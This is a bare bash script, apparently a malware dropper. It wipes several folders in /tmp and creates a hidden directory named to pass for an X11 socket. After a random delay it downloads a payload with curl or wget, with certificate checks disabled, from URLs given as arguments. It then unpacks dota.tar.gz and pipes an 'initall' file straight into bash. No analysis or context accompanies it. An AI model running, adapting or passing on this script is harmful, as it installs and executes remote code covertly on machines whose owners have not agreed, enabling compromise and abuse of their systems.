#!/bin/bash
if [ -d "/tmp/.X13-unix/.rsync/c" ]; then
	exit 0
else
	cd /tmp	
	rm -rf .ssh
	rm -rf .mountfs
	rm -rf .X13-unix
	mkdir .X13-unix
	cd .X13-unix
	RANGE=6
	s=$RANDOM
	let "s %= $RANGE"
if [ $s == 0 ]; then
			sleep $[ ( $RANDOM % 500 )  + 15 ]s
			curl -O -f $1 || wget -w 3 -T 10 -t 2 -q --no-check-certificate $1
		fi
if [ $s == 1 ]; then
			sleep $[ ( $RANDOM % 500 )  + 5 ]s
			curl -O -f $2 || wget -w 3 -T 10 -t 2 -q --no-check-certificate $2
		fi
if [ $s == 2 ]; then
			sleep $[ ( $RANDOM % 500 )  + 25 ]s
			curl -O -f $3 || wget -w 3 -T 10 -t 2 -q --no-check-certificate $3
		fi
if [ $s == 3 ]; then
			sleep $[ ( $RANDOM % 500 )  + 10 ]s
			curl -O -f $4 || wget -w 3 -T 10 -t 2 -q --no-check-certificate $4
		fi
if [ $s == 4 ]; then
			sleep $[ ( $RANDOM % 500 )  + 30 ]s
			curl -O -f $5 || wget -w 3 -T 10 -t 2 -q --no-check-certificate $5
		fi
if [ $s == 5 ]; then
			sleep $[ ( $RANDOM % 500 )  + 15 ]s
			curl -O -f $6 || wget -w 3 -T 10 -t 2 -q --no-check-certificate $6
		fi
if [ $s == 6 ]; then
			sleep $[ ( $RANDOM % 500 )  + 55 ]s
			curl -O -f $7 || wget -w 3 -T 10 -t 2 -q --no-check-certificate $7
		fi
	sleep 60s
	tar xvf dota.tar.gz
	sleep 10s
#	rm -rf dota.tar.gz
	cd .rsync
	cat /tmp/.X13-unix/.rsync/initall | bash
fi
exit 0
